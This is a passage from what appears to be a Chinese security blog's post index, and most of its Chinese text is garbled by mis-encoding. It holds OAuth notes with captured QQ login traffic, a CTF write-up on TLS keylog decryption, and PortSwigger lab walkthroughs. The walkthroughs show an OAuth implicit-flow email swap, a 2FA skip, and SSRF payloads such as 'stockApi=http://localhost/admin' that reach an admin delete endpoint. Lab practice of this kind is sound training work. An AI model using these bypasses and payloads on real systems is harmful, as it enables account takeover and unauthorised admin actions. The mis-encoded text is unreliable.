å­¦çš„çŸ¥è¯†ï¼Œæœ¬æ–‡å°±ä¸å±•å¼€è§£é‡Šäº†ï¼Œæœ‰å…´è¶£è¯·çœ‹ [ä»€ä¹ˆæ˜¯æ¶ˆæ¯éªŒè¯ç MAC](https://www.cnblogs.com/blowing00/p/14872305.html) ã€‚æ€»ä¹‹ï¼Œæ”»å‡»è€…å› ä¸ºæ²¡æœ‰è¿™ä¸ªå¯†é’¥ï¼Œæ— æ³•å¯¹è¯·æ±‚åšå‡º MACï¼Œå› æ­¤å°±ç®—çªƒå–åˆ° codeï¼Œä¹Ÿä¸èƒ½ç”¨ code æ¥å…‘æ¢ access tokenã€‚\n\n \n\nã€€ã€€æ ¹æ®ä¸Šé¢çš„æ¢³ç†ï¼Œå¯ä»¥çŸ¥é“ï¼Œè¦å®ç°ä¸€å¥— Authorization Code æˆæƒæµç¨‹ï¼Œéœ€è¦åšä¸¤ä¸ª endpointï¼š\n\nã€€ã€€\n\nã€€ã€€1ï¼ŒAuth Endpointï¼š GET /oauth2/authã€€ã€€è¿™å°±æ˜¯ç¬¬ 2 æ­¥çš„æˆæƒé¡µé¢åœ°å€\n\nã€€ã€€å‚æ•°ï¼š\n\nã€€ã€€ã€€ã€€client_id å‘èµ·æˆæƒçš„åˆä½œæ–¹çš„ client_idã€‚å¿…å¡«\n\nã€€ã€€ã€€ã€€redirect_uri å›è°ƒåœ°å€ï¼Œä¹Ÿå°±æ˜¯ç¬¬ 4 æ­¥ 302 è·³è½¬çš„åœ°å€ï¼Œç”¨äºæ¥æ”¶ codeã€‚è¿™ä¸ªå‚æ•°æ˜¯å¯é€‰çš„ã€‚å› ä¸ºåœ¨å‰æœŸå‘èµ·åˆä½œç”³è¯·çš„æ—¶å€™ï¼ŒA æ˜¯éœ€è¦æå‰å°†è¿™ä¸ªåœ°å€æ³¨å†Œç»™ B çš„ã€‚å¦‚æœæ²¡æœ‰ä¼ ï¼Œåˆ™ä½¿ç”¨æ³¨å†Œçš„é»˜è®¤å€¼\n\nã€€ã€€ã€€ã€€**scope æˆæƒèŒƒå›´**ã€‚è¿™ä¸ªä¹Ÿæ˜¯å¯é€‰çš„ã€‚B å¯ä»¥æŠŠèµ„æºè¿›è¡Œåˆ’åˆ†ï¼Œåˆ†æˆå¤šä¸ª scopeã€‚A å‘èµ·æˆæƒçš„æ—¶å€™ï¼Œå¯ä»¥æŒ‡æ˜è¦å“ªäº› scope çš„è®¿é—®æƒé™\n\nã€€ã€€ã€€ã€€state ä¸€ä¸ªç”± A ç”Ÿæˆçš„ï¼Œéšæœºä¸”å”¯ä¸€çš„å­—ç¬¦ä¸²ã€‚è¿™ä¸ªæ˜¯ç”¨æ¥é˜² CSRF æ”»å‡»çš„\n\n\n\n![image-20250617173642261](http://images.lwwww.top/images/20250617173643461.png)\n\n```\nå½“ç”¨æˆ·è®¿é—®èµ„æºæ—¶ï¼Œæ¯”å¦‚åœ¨ç½‘æ˜“äº‘éŸ³ä¹ä¸­ä½¿ç”¨ç¬¬ä¸‰æ–¹ç™»å½•åŠŸèƒ½ï¼Œä¾‹å¦‚QQç™»å½•ï¼Œé‚£ä¹ˆè¿™é‡Œçš„èµ„æºå°±æ˜¯ç”¨æˆ·çš„QQæ˜µç§°å’Œå¤´åƒç­‰ä¿¡æ¯ã€‚æ­¤æ—¶ç¬¬ä¸‰æ–¹åº”ç”¨ï¼ˆç½‘æ˜“äº‘éŸ³ä¹ï¼‰å°†å‘é€è¯·æ±‚åˆ°æˆæƒæœåŠ¡å™¨ï¼ˆQQï¼‰å»è·å–æˆæƒï¼Œæ­¤æ—¶æˆæƒæœåŠ¡å™¨ï¼ˆQQï¼‰å°†è¿”å›ä¸€ä¸ªç•Œé¢ç»™ç”¨æˆ·ï¼Œç”¨æˆ·éœ€è¦ç™»å½•åˆ°QQï¼Œå¹¶åŒæ„æˆæƒç½‘æ˜“äº‘éŸ³ä¹è·å¾—æŸäº›ä¿¡æ¯ï¼ˆèµ„æºï¼‰ã€‚å½“ç”¨æˆ·åŒæ„æˆæƒåï¼ŒæˆæƒæœåŠ¡å™¨å°†è¿”å›ä¸€ä¸ªæˆæƒç ï¼ˆAuthorization Codeï¼‰\nç»™ç¬¬ä¸‰æ–¹åº”ç”¨ï¼Œæ­¤æ—¶ç¬¬ä¸‰æ–¹åº”ç”¨åœ¨é€šè¿‡client_idã€client_secretï¼ˆè¿™æ˜¯éœ€è¦ç¬¬ä¸‰æ–¹åº”ç”¨åœ¨æˆæƒæœåŠ¡å™¨å»ç”³è¯·çš„ï¼‰å’Œæˆæƒç å»è·å¾—Access Tokenå’ŒRefresh Tokenï¼Œæ­¤æ—¶æˆæƒç å°†å¤±æ•ˆã€‚ç„¶åå°±æ˜¯ç¬¬ä¸‰æ–¹åº”ç”¨é€šè¿‡Access Tokenå»èµ„æºæœåŠ¡å™¨è¯·æ±‚èµ„æºäº†ï¼Œèµ„æºæœåŠ¡å™¨æ ¡éªŒAccess TokenæˆåŠŸåå°†è¿”å›èµ„æºç»™ç¬¬ä¸‰æ–¹åº”ç”¨ã€‚\n è¿™ä¸ªæ˜¯æˆ‘ç‚¹å‡»qqç™»å½•åæ¨é€çš„é¡µé¢ \n graph.qq.com/oauth2.0/show?which=Login&display=pc&client_id=100312028&response_type=code&redirect_uri=https%3A%2F%2Fpassport.baidu.com%2Fphoenix%2Faccount%2Fafterauth%3Fmkey%3D95a67454940271d50cfcde5e933cbe5921cd3c0297e652c6dc%26tpl%3Dmn&state=1750154092&display=page&scope=get_user_info%2Cadd_share%2Cget_other_info%2Cget_fanslist%2Cget_idollist%2Cadd_idol%2Cget_simple_userinfo&traceid=\n```\n\n```\ngraph.qq.com/oauth2.0/show?which=Login&display=pc&**client_id=100312028**&response_type=code&redirect_uri=https://passport.baidu.com/phoenix/account/afterauth?mkey=95a67454940271d50cfcde5e933cbe5921cd3c0297e652c6dc&tpl=mn&state=1750154092&display=page&scope=get_user_info,add_share,get_other_info,get_fanslist,get_idollist,add_idol,get_simple_userinfo&traceid=\n```\n\nclient_idå¯¹åº”å‡ºæ¥äº†ç¬¬ä¸€æ­¥ï¼Œä½†æ˜¯ç”±äºæˆ‘ä»¬è¿˜æ²¡æœ‰ç™»å½•åˆ°qqçš„oauthè®¤è¯çš„æ¿å—ä¹Ÿå°±æ˜¯çœ‹åˆ°çš„graph.qq.comçš„åŸŸå æ‰€ä»¥ä¸èƒ½è¿›è¡Œä¸‹ä¸€æ­¥--**ç¡®è®¤æˆæƒ**\n\n![image-20250617175254292](http://images.lwwww.top/images/20250617175256563.png)\n\n\n\n\n\n\n\n![image-20250617181704970](http://images.lwwww.top/images/20250617181706444.png)\n\n```\nPOST /speed?id=RiaWqsnT3403yXTgVY&uin=5e637f0000012299-097977a4fd7a8afa-9020&version=9fce2a54&aid=f61ac0fc-29e6-4a54-ba88-1410ed52a180&env=production&platform=3&netType=100&vp=407 * 331&sr=1920 * 1080&sessionId=session-1750155370383&from=https://xui.ptlogin2.qq.com/cgi-bin/xlogin?appid=716027609&daid=383&style=33&login_text=ç™»å½•&hide_title_bar=1&hide_border=1&target=self&s_url=https://graph.qq.com/oauth2.0/login_jump&pt_3rd_aid=100312028&pt_feedback_link=https://support.qq.com/products/77942?customInfo=www.baidu.com.appid100312028&theme=2&verify_theme=&referer=https://graph.qq.com/\n```\n\n![image-20250619105901364](http://images.lwwww.top/images/20250619105910537.png)\n\nç„¶åå›åŒ…æ˜¯è¿™æ ·çš„\n\n```\nresponse_type=code&client_id=100312028&redirect_uri=https://passport.baidu.com/phoenix/account/afterauth?mkey=188101cf26a4c3a6ce7bcd20322fe5c6e1506adeb783209b76&tpl=mn&scope=get_user_info,add_share,get_other_info,get_fanslist,get_idollist,add_idol,get_simple_userinfo&state=1750300730&switch=&from_ptlogin=1&src=1&update_auth=1&openapi=1010&g_tk=1573676930&auth_time=1750300769539&ui=A78DC9BA-5CF3-4B9D-A2A2-6A998F4002C4\n```\n\n![284b219931d0254f822b2d139a13898](http://images.lwwww.top/images/20250619110425261.png)\n\n\n\n### BPé¶åœºæ‰“ä¸€ä¸‹â€”â€”éšå¼\n\n```\nhttps://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow\n```\n\n![image-20250624103923012](http://images.lwwww.top/images/20250624103932086.png)\n\n![image-20250624104007440](http://images.lwwww.top/images/20250624104009581.png)\n\n\n\nè¿™ä¸ªåœ°æ–¹ä¸€å¼€å§‹æ²¡ç†è§£å¥½ æƒ³ç€æ€ä¹ˆä¸€ç™»å½•å°±å˜æˆäº†Oauthå•Š åæ¥è¿‡æ¥ä¸¤å¤©æ‰ååº”è¿‡æ¥è¿™ç›´æ¥å°±æ˜¯ä¸€ä¸ªOauthçš„æ¥å£ä¹Ÿå°±æ˜¯ç›´æ¥å°±æ˜¯å¾®ä¿¡ç™»å½•....\n\næœäº†\n\n![image-20250624104157535](http://images.lwwww.top/images/20250624104159088.png)\n\nè¾“å…¥è´¦å¯†ä»¥åæ˜¯å¯¹B/é‰´æƒæœåŠ¡å™¨çš„ä¸€ä¸ªç™»å½• ç„¶åè¿™ä¸ªé¡µé¢æ˜¯å¯¹Aä¹Ÿå°±æ˜¯è¦æˆæƒ/ä½¿ç”¨çš„ç½‘ç«™çš„ä¸€ä¸ªæˆæƒ\n\nä»–è¦æˆ‘bä¸Šé¢å¾—profileå’Œemail\n\n```\nGET /auth?client_id=a4jt0cmw0ft69srfmpds7&redirect_uri=https://0a62002b03684beb82827a9e00cf0082.web-security-academy.net/oauth-callback&response_type=token&nonce=-847450422&scope=openid%20profile%20email HTTP/2\nHost: oauth-0a3300ad03c84b7782bc789802780049.oauth-server.net\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nReferer: https://0a62002b03684beb82827a9e00cf0082.web-security-academy.net/\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: cross-site\nPriority: u=0, i\nTe: trailers\nConnection: keep-alive\n\n\n```\n\nç¿»æ•°æ®åŒ…ï¼Œçœ‹åˆ°/authenticateè·¯å¾„ä¸‹å°±æ˜¯æˆ‘ä»¬è®¤è¯çš„æ ¡éªŒå€¼ï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„çš„å°±æ˜¯æˆ‘ä»¬çš„è¿™ä¸ªtokenå€¼ï¼Œä¹Ÿå°±æ˜¯æˆ‘ç”»çš„é‚£å¼ å›¾ç‰‡ï¼Œè¿™é‡Œå°±ç›´æ¥æ ¡éªŒtokenå€¼ï¼Œæˆ‘ä»¬ç›´æ¥æŠŠemailè¿›è¡Œæ›¿æ¢ï¼Œç„¶åå†æ”¾åŒ…å‘åŒ…æ“ä½œ\n\n![image-20250624113013205](http://images.lwwww.top/images/20250624113017469.png)\n\n![image-20250624113336546](http://images.lwwww.top/images/20250624113338786.png)\n\nå”‰å”‰æ€ä¹ˆè§£å†³å•¦å¥½å‰å®³\n","tags":["-web -oauth -src"]},{"title":"SRCå­¦ä¹ â€”â€”CSRF","url":"/2025/06/09/SRCå­¦ä¹ â€”â€”CSRF/","tags":["-web -src -csrf"]},{"title":"CDNç»•è¿‡-æŸ¥æ‰¾çœŸå®IP","url":"/2025/06/09/CDNç»•è¿‡-æŸ¥æ‰¾çœŸå®IP/"},{"title":"BPé¶åœºä¹‹api","url":"/2025/05/26/BPé¶åœºä¹‹api/","content":"\n- `GET`- ä»èµ„æºæ£€ç´¢æ•°æ®ã€‚\n\n- `PATCH`- å¯¹èµ„æºåº”ç”¨éƒ¨åˆ†æ›´æ”¹ã€‚\n\n- `OPTIONS`- æ£€ç´¢æœ‰å…³èµ„æºä¸Šå¯ä»¥ä½¿ç”¨çš„è¯·æ±‚æ–¹æ³•çš„ç±»å‹çš„ä¿¡æ¯ã€‚\n\n  \n\n  API ç«¯ç‚¹å¯èƒ½æ”¯æŒä¸åŒçš„ HTTP æ–¹æ³•ã€‚å› æ­¤,åœ¨ç ”ç©¶ API ç«¯ç‚¹æ—¶æµ‹è¯•æ‰€æœ‰æ½œåœ¨æ–¹æ³•éå¸¸é‡è¦ã€‚è¿™å¯èƒ½ä½¿æ‚¨èƒ½å¤Ÿè¯†åˆ«é¢å¤–çš„ç«¯ç‚¹åŠŸèƒ½,æ‰“å¼€æ›´å¤šæ”»å‡»é¢ã€‚  ä¾‹å¦‚,ç«¯ç‚¹/api/taskså¯ä»¥æ”¯æŒä»¥ä¸‹æ–¹æ³•:  â€¢ GET /api/tasks- æ£€ç´¢ä»»åŠ¡åˆ—è¡¨ã€‚ â€¢ POST /api/tasksåˆ›å»ºä¸€ä¸ªæ–°ä»»åŠ¡ã€‚ â€¢ DELETE /api/tasks/1åˆ é™¤ä¸€ä¸ªä»»åŠ¡ã€‚  æ‚¨å¯ä»¥ä½¿ç”¨ Burp Intruder ä¸­å†…ç½®çš„ HTTP åŠ¨è¯åˆ—è¡¨è‡ªåŠ¨å¾ªç¯é€šè¿‡ä¸€ç³»åˆ—æ–¹æ³•ã€‚ \n\n  \n\nâ€‹    API ç«¯ç‚¹é€šå¸¸æœŸæœ›ä»¥ç‰¹å®šæ ¼å¼æä¾›æ•°æ®ã€‚å› æ­¤,å®ƒä»¬çš„è¡Œä¸ºå¯èƒ½æœ‰æ‰€ä¸åŒ,å…·ä½“å–å†³äºè¯·æ±‚ä¸­æä¾›çš„æ•°æ®çš„å†…å®¹ç±»å‹ã€‚æ›´æ”¹å†…å®¹ç±»å‹å¯èƒ½ä½¿æ‚¨èƒ½å¤Ÿ:\n\n- è§¦å‘é”™è¯¯,æŠ«éœ²æœ‰ç”¨ä¿¡æ¯ã€‚\n- ç»•è¿‡æœ‰ç¼ºé™·çš„é˜²å¾¡ã€‚\n- åˆ©ç”¨å¤„ç†é€»è¾‘çš„å·®å¼‚ã€‚ä¾‹å¦‚,APIåœ¨å¤„ç†JSONæ•°æ®æ—¶å¯èƒ½æ˜¯å®‰å…¨çš„,ä½†åœ¨å¤„ç†XMLæ—¶å®¹æ˜“å—åˆ°æ³¨å…¥æ”»å‡»ã€‚\n\nâ€‹    è¦æ›´æ”¹å†…å®¹ç±»å‹,è¯·ä¿®æ”¹`Content-Type`header,ç„¶åç›¸åº”åœ°é‡æ–°æ ¼å¼åŒ–è¯·æ±‚ä½“ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å†…å®¹ç±»å‹è½¬æ¢å™¨ BApp è‡ªåŠ¨è½¬æ¢ XML å’Œ JSON ä¹‹é—´è¯·æ±‚ä¸­æäº¤çš„æ•°æ®ã€‚\n","tags":["-web -bp -é¶åœº -æ¸—é€"]},{"title":"BPé¶åœºä¹‹èº«ä»½è®¤è¯æ¼æ´","url":"/2025/05/22/BPé¶åœºä¹‹èº«ä»½è®¤è¯æ¼æ´/","content":"\n### èº«ä»½éªŒè¯æ¼æ´ \n\nä»æ¦‚å¿µä¸Šè®²,èº«ä»½éªŒè¯æ¼æ´å¾ˆå®¹æ˜“ç†è§£ã€‚ç„¶è€Œ,ç”±äºèº«ä»½éªŒè¯ä¸å®‰å…¨ä¹‹é—´çš„æ˜ç¡®å…³ç³»,å®ƒä»¬é€šå¸¸è‡³å…³é‡è¦ã€‚  èº«ä»½éªŒè¯æ¼æ´å¯ä»¥è®©æ”»å‡»è€…è®¿é—®æ•æ„Ÿæ•°æ®å’ŒåŠŸèƒ½ã€‚å®ƒä»¬è¿˜æš´éœ²äº†é¢å¤–çš„æ”»å‡»é¢,ä»¥ä¾¿è¿›ä¸€æ­¥åˆ©ç”¨ã€‚å› æ­¤,äº†è§£å¦‚ä½•è¯†åˆ«å’Œåˆ©ç”¨èº«ä»½éªŒè¯æ¼æ´ä»¥åŠå¦‚ä½•ç»•è¿‡å¸¸è§çš„ä¿æŠ¤æªæ–½éå¸¸é‡è¦ã€‚\n\n![password-reset-poisoning](http://images.lwwww.top/images/20250522210059037.svg)\n\n\n\n```\nè®¤è¯å’Œæˆæƒçš„åŒºåˆ«ï¼š\n\tèº«ä»½éªŒè¯æ˜¯éªŒè¯ç”¨æˆ·æ˜¯å¦æ˜¯ä»–ä»¬å£°ç§°æ˜¯è°çš„è¿‡ç¨‹ã€‚\n\tæˆæƒæ¶‰åŠéªŒè¯ç”¨æˆ·æ˜¯å¦è¢«å…è®¸åšæŸäº‹ã€‚\n```\n\n#### Lab: Username enumeration via different responses\n\n![image-20250522214543481](http://images.lwwww.top/images/20250522214546197.png)\n\nè¿›è¡Œä¸€ä¸ªçˆ†ç ´\n\nç”¨æˆ·åå’Œå¯†ç çš„åˆ—è¡¨å·²ç»ç»™å‡º\n\nä¸€å¼€å§‹çš„æ€è·¯æ˜¯ï¼Œé›†ç¾¤ç‚¸å¼¹ç›´æ¥æ¢­å“ˆ\n\nä½†æ˜¯wpæ˜¯ç‹™å‡»æ‰‹å»éå†ï¼Œè¿™é‡Œæˆ‘å°±ç›´æ¥æ¢­å“ˆäº†\n\n![image-20250522231415234](http://images.lwwww.top/images/20250522231417554.png)\n\nç­›é€‰é•¿åº¦ è¿™ä¸ªå°±æ˜¯å¯†ç äº†\n\nç›´æ¥ç™»å½•è¿›å»å°±æ¬§å…‹äº†\n\n### ç»•è¿‡åŒå› ç´ èº«ä»½éªŒè¯\n\nâ€‹            æœ‰æ—¶,åŒå› ç´ èº«ä»½éªŒè¯çš„å®ç°å­˜åœ¨ç¼ºé™·,ä»¥è‡³äºå¯ä»¥å®Œå…¨ç»•è¿‡å®ƒã€‚        \n\nâ€‹             å¦‚æœç”¨æˆ·é¦–å…ˆè¢«æç¤ºè¾“å…¥å¯†ç ,ç„¶åæç¤ºåœ¨å•ç‹¬çš„é¡µé¢ä¸Šè¾“å…¥éªŒè¯ç ,åˆ™ç”¨æˆ·åœ¨è¾“å…¥éªŒè¯ç ä¹‹å‰å®é™…ä¸Šå¤„äºâ€œç™»å½•â€çŠ¶æ€ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹,å€¼å¾—æµ‹è¯•çš„æ˜¯,åœ¨å®Œæˆç¬¬ä¸€ä¸ªèº«ä»½éªŒè¯æ­¥éª¤å,æ˜¯å¦å¯ä»¥ç›´æ¥è·³åˆ°â€œä»…ç™»å½•â€é¡µé¢ã€‚å¶å°”,ä½ ä¼šå‘ç°ä¸€ä¸ªç½‘ç«™å®é™…ä¸Šå¹¶æ²¡æœ‰åœ¨åŠ è½½é¡µé¢ä¹‹å‰æ£€æŸ¥ä½ æ˜¯å¦å®Œæˆäº†ç¬¬äºŒæ­¥ã€‚        \n\n\n\n#### Lab: 2FA simple bypass\n\n![image-20250523001507819](http://images.lwwww.top/images/20250524133630462.png)\n\nå…ˆç”¨é¢˜ç›®ç»™çš„è´¦å·ç™»å½•è¿›å»ç„¶åä¼šè‡ªåŠ¨å‘é€é‚®ä»¶ è¿™ä¸ªæ—¶å€™ä½ å»é€€å‡º/è¿”å›é¡µé¢çš„æ—¶å€™ å†è¿›å»è´¦æˆ·å°±å·²ç»æ˜¯ç™»å½•çš„çŠ¶æ€äº† ä¹Ÿå°±æ˜¯è¯´éªŒè¯ç å…¶å®æ²¡æœ‰ç”¨åˆ° åªæ˜¯å‘é€äº† \n\né‚£ä¹ˆä¾æ®è¿™ä¸ªæƒ…å†µ å¯ä»¥ç›´æ¥è®¿é—®carlosçš„è´¦æˆ· ç™»å½•ç„¶åç›´æ¥è¿›å…¥è´¦æˆ·é¡µé¢å³å¯\n\n![image-20250523121158175](http://images.lwwww.top/images/20250523121208589.png)\n\n### SSRF\n\nâ€‹            æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ æ˜¯ä¸€ä¸ªWebå®‰å…¨æ¼æ´,å…è®¸æ”»å‡»è€…å¯¼è‡´æœåŠ¡å™¨ç«¯åº”ç”¨ç¨‹åºå‘æ„å¤–ä½ç½®å‘å‡ºè¯·æ±‚ã€‚        \n\nâ€‹            åœ¨å…¸å‹çš„ SSRF æ”»å‡»ä¸­,æ”»å‡»è€…å¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¿æ¥åˆ°ç»„ç»‡åŸºç¡€æ¶æ„å†…çš„å†…éƒ¨æœåŠ¡ã€‚åœ¨å…¶ä»–æƒ…å†µä¸‹,å®ƒä»¬å¯èƒ½èƒ½å¤Ÿå¼ºåˆ¶æœåŠ¡å™¨è¿æ¥åˆ°ä»»æ„å¤–éƒ¨ç³»ç»Ÿã€‚è¿™å¯èƒ½ä¼šæ³„éœ²æ•æ„Ÿæ•°æ®,ä¾‹å¦‚æˆæƒå‡­æ®ã€‚        \n\n##### å¯¹æœåŠ¡å™¨çš„ SSRF æ”»å‡»\n\nâ€‹            åœ¨é’ˆå¯¹æœåŠ¡å™¨çš„ SSRF æ”»å‡»ä¸­,æ”»å‡»è€…é€šè¿‡å…¶ç¯å›ç½‘ç»œæ¥å£,ä½¿åº”ç”¨ç¨‹åºå‘æ‰˜ç®¡åº”ç”¨ç¨‹åºçš„æœåŠ¡å™¨å‘å‡º HTTP è¯·æ±‚ã€‚è¿™é€šå¸¸æ¶‰åŠæä¾›ä¸€ä¸ªåŒ…å«ä¸»æœºåçš„URL,ä¾‹å¦‚`127.0.0.1`(æŒ‡å‘ç¯å›é€‚é…å™¨çš„ä¿ç•™ IP åœ°å€)æˆ–`localhost`(åŒä¸€é€‚é…å™¨å¸¸ç”¨çš„åç§°)ã€‚        \n\nâ€‹            ä¾‹å¦‚,æƒ³è±¡ä¸€ä¸ªè´­ç‰©åº”ç”¨ç¨‹åº,è®©ç”¨æˆ·æŸ¥çœ‹ç‰¹å®šå•†åº—ä¸­æ˜¯å¦æœ‰åº“å­˜çš„ç‰©å“ã€‚è¦æä¾›åº“å­˜ä¿¡æ¯,åº”ç”¨ç¨‹åºå¿…é¡»æŸ¥è¯¢å„ç§åç«¯ REST  APIã€‚å®ƒé€šè¿‡å‰ç«¯HTTPè¯·æ±‚å°†URLä¼ é€’ç»™ç›¸å…³çš„åç«¯APIç«¯ç‚¹æ¥åšåˆ°è¿™ä¸€ç‚¹ã€‚å½“ç”¨æˆ·æŸ¥çœ‹æŸä¸ªé¡¹ç›®çš„åº“å­˜çŠ¶æ€æ—¶,å…¶æµè§ˆå™¨ä¼šæå‡ºä»¥ä¸‹è¯·æ±‚:     \n\n   \n\n```\nPOST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://stock.weliketoshop.net:8080/product/stock/check%3Fp\nroductId%3D6%26storeId%3D1\n```\n\nâ€‹            è¿™å¯¼è‡´æœåŠ¡å™¨å‘æŒ‡å®šçš„URLå‘å‡ºè¯·æ±‚,æ£€ç´¢åº“å­˜çŠ¶æ€,å¹¶å°†å…¶è¿”å›ç»™ç”¨æˆ·ã€‚        \n\nâ€‹            åœ¨æœ¬ä¾‹ä¸­,æ”»å‡»è€…å¯ä»¥ä¿®æ”¹è¯·æ±‚ä»¥æŒ‡å®šæœåŠ¡å™¨æœ¬åœ°çš„ URL:        \n\n```\nPOST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://localhost/admin\n```\n\nâ€‹            æœåŠ¡å™¨è·å–å†…å®¹`/admin`URL å¹¶è¿”å›ç»™ç”¨æˆ·ã€‚        \n\nâ€‹            æ”»å‡»è€…å¯ä»¥è®¿é—®`/admin`URL,ä½†ç®¡ç†åŠŸèƒ½é€šå¸¸åªå¯¹ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·è®¿é—®ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…ä¸ä¼šçœ‹åˆ°ä»»ä½•æ„Ÿå…´è¶£çš„ä¸œè¥¿ã€‚ä½†æ˜¯,å¦‚æœè¯·æ±‚`/admin`URLæ¥è‡ªæœ¬åœ°æœºå™¨,æ­£å¸¸çš„è®¿é—®æ§åˆ¶è¢«ç»•è¿‡ã€‚åº”ç”¨ç¨‹åºæˆäºˆå¯¹ç®¡ç†åŠŸèƒ½çš„å®Œå…¨è®¿é—®æƒé™,å› ä¸ºè¯¥è¯·æ±‚ä¼¼ä¹æ¥è‡ªå—ä¿¡ä»»çš„ä½ç½®ã€‚     \n\n#### Lab: Basic SSRF against the local server   \n\nå®éªŒå®¤å•†å“æœ‰ä¸€ä¸ªæŸ¥çœ‹åº“å­˜ æœ‰ä¸€ä¸ªapiæ¥å£\n\n![image-20250524132108061](http://images.lwwww.top/images/20250524132117956.png)æ˜¯é€šè¿‡è¿™ä¸€ä¸ªåœ°æ–¹å»è¿›è¡Œä¸€ä¸ªè°ƒç”¨\n\næ­£å¸¸çš„ç®¡ç†å‘˜é¡µé¢æ˜¯/admin\n\næˆ‘ä»¬æ˜¯è®¿é—®ä¸åˆ°çš„ \n\n![](http://images.lwwww.top/images/20250524132944426.png\n\nç„¶åä¿®æ”¹ä¸€ä¸‹apiå»è°ƒç”¨çš„ä¼ å‚ è®¿é—® `http://localhost/admin`\n\n![image-20250524133251968](http://images.lwwww.top/images/20250524133623188.png)\n\nç„¶åæˆ‘ä»¬è®¿é—®åˆ°è¿™ä¸ªé¡µé¢çœ‹ä¸€ä¸‹ æ‰¾åˆ°åˆ é™¤çš„é“¾æ¥ \n\n![image-20250524133434159](http://images.lwwww.top/images/20250524133620747.png)\n\n\n\n![image-20250524133421303](http://images.lwwww.top/images/20250524133618115.png)\n\n\n\n`/admin/delete?username=carlos`\n\nç„¶åå°±å¾ˆæ˜¾è€Œæ˜“è§äº† ç›´æ¥æ•´ä¸€ä¸ªpayloadå°±æ˜¯\n\n![image-20250524133548188](http://images.lwwww.top/images/20250524133612755.png)\n\n\n\nè§£å†³\n\n#### Lab: Basic SSRF against another back-end system\n\nè¿™ä¸ªå’Œå‰é¢ä¸€æ · åªä¸è¿‡ä¸æ˜¯å›ºå®šçš„localhostå’Œ127.0.0.1äº† å˜æˆå†…ç½‘çš„æŸä¸ªåœ°å€äº† å¤šäº†ä¸€æ­¥æ¢æµ‹å†…ç½‘çš„æ­¥éª¤\n\nå‰©ä¸‹çš„æ²¡å•¥å¥½è®°å½•çš„äº†-~~è¿˜æ˜¯æ‡’ï¼Œå—¯å°±å…ˆåˆ°è¿™äº†~~\n","tags":["-æ¸—é€ -web -bp -é¶åœº"]},{"title":"è½¯ä»¶å®‰å…¨èµ›å¤ç°","url":"/2025/03/24/è½¯ä»¶å®‰å…¨èµ›å¤ç°/","content":"\nåç‰¢æ²¡è§£å‡º\n\nä½†æ˜¯èµ›åçœ‹wpæ€è·¯å‡ ä¹ä¸€è‡´ åªå·®ä¸€ä¸ª5Gçš„å°çŸ¥è¯†ç‚¹\n\n![image-20250324191942717](http://images.lwwww.top/images/20250324191952203.png)\n\nâ€‹\twiresharkæ‰“å¼€æ–‡ä»¶\n\nä»å¤´å¼€å§‹æ‹çš„è¯\n\næˆ‘çš„æ€è·¯æ˜¯\n\n```\nå…ˆçœ‹åˆ°åè®® ä¸€çœ¼æœ›å»éƒ½æ˜¯tcpç„¶åè¿˜æœ‰ä¸€ä¸ªç‚¹æ˜¯ç›®çš„ipå’Œæºipéƒ½æ˜¯127.0.0.1----æ‰€ä»¥é»˜è®¤æ²¡ç”¨äº† ç„¶åå°±çœ‹åˆ°ICMPv6æœ‰TLSv1.2\n```\n\n![image-20250324193307365](http://images.lwwww.top/images/20250324193309693.png)\n\n\n\nè¿™ä¸ªæ—¶å€™ç»“åˆé¢˜ç›®5Gä¸»é¢˜çŒœä¹ŸçŸ¥é“å…³é”®ç‚¹å°±æ˜¯è¿™ä¸ªTLSçš„æ¶ˆæ¯\n\n```\nTLSæµé‡æ˜¯æŒ‡é€šè¿‡TLSåè®®åŠ å¯†çš„æ•°æ®ä¼ è¾“ï¼Œå®ƒåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´å»ºç«‹ä¸€ä¸ªåŠ å¯†çš„é€šé“ï¼Œç¡®ä¿æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¸è¢«çªƒå¬ã€ç¯¡æ”¹æˆ–ä¼ªé€ ã€‚\n\nä¸€èˆ¬çš„TLSæµé‡å°±æ˜¯æ‰¾åˆ°keyï¼Œå¯¼å…¥keyï¼Œåœ¨å¯¼å…¥keyä¹‹åå°±ä¼šå¤šå‡ºå‡ ä¸ªæµé‡åŒ…ï¼ˆå³åŠ å¯†æµé‡åŒ…ï¼‰ï¼Œåœ¨é‡Œè¾¹ä¼šæœ‰æƒ³è¦çš„ç­”æ¡ˆã€‚\n```\n\n![image-20250324201837766](http://images.lwwww.top/images/20250324201839705.png)\n\nmiscæ‰‹çš„é€šç—… å°±æ˜¯å·¥å…·æ¢­å“ˆè¯•è¯• æ‰€ä»¥å¯åŠ¨NetA\n\n![image-20250324201947704](http://images.lwwww.top/images/20250324201949767.png)\n\nåœ¨è¿™é‡Œä¹Ÿæ˜¯ æ‰¾åˆ°äº†å…³é”®ç‚¹ ä¹Ÿå°±è¿™ä¸ªTLS.keylog\n\nä½†æ˜¯å½“æ—¶åœ¨ç°åœºæ²¡æœ‰è¿™ä¸ªçŸ¥è¯†ç‚¹ 